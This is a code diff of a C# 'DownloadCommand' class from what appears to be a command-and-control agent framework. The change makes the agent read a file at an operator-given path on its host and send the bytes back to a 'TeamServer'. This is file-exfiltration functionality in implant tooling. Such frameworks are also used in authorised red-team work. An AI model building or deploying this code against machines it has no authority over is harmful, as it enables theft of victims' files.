@@ -1,37 +1,54 @@
 ﻿using Agent.Models;
+using Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
 {
     public class DownloadCommand : AgentCommand
     {
-        public override string Name => "download";
-
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.Download;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            this.CheckFileDownloaded(task, context);
+            task.ThrowIfParameterMissing(ParameterId.Path);
 
-            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
-            string fileName = file.Name;
+            string path = task.GetParameter<string>(ParameterId.Path);
 
-            if (task.SplittedArgs.Count() > 0)
+            if (!System.IO.File.Exists(path))
             {
-                fileName = task.SplittedArgs[0];
+                context.AppendResult($"File {path} not found.");
+                return;
             }
 
-            var fileContent = file.GetFileContent();
-
-            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
+            byte[] fileBytes = null;
+            using (FileStream fs = System.IO.File.OpenRead(path))
             {
-                fs.Write(fileContent, 0, fileContent.Length);
+                fileBytes = new byte[fs.Length];
+                fs.Read(fileBytes, 0, (int)fs.Length);
             }
 
-            context.Result.Result = $"File downloaded to {fileName}." + Environment.NewLine;
+            string fileName = string.Empty;
+            if (task.HasParameter(ParameterId.Name))
+                fileName = task.GetParameter<string>(ParameterId.Name);
+            else
+                fileName =  Path.GetFileName(path);
+
+
+            context.Objects(new DownloadFile()
+            {
+                Id = ShortGuid.NewGuid(),
+                FileName = fileName,
+                Path = path,
+                Data = fileBytes,
+                Source = context.Agent.MetaData.Id,
+            });
+
+            context.AppendResult($"File {path} downloaded to TeamServer.");
         }
     }
 }
